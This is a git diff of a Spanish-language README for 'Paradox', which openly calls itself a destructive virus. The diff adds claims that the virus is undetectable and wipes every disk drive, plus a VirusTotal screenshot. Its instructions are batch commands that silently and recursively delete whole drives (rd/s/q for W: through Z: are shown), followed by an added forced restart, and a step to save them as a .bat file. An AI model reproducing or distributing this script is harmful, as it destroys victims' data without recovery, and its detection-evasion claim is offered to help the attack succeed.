@@ -1,6 +1,10 @@
 # Paradox
 
-Es un virus destructivo capas de formatear la PC de la víctima.
+Es un virus destructivo indetectable capas de formatear todas la unidades de disco de la PC de la víctima.
+
+<p align="center">
+<img src="./Img/VirusTotal.png">
+</p>
 
 ## USO
 
@@ -34,6 +38,7 @@ rd/s/q W:
 rd/s/q X:
 rd/s/q Y:
 rd/s/q Z:
+shutdown /r
 ```
 
 Luego lo guardamos con la siguiente extension **archivo.bat**
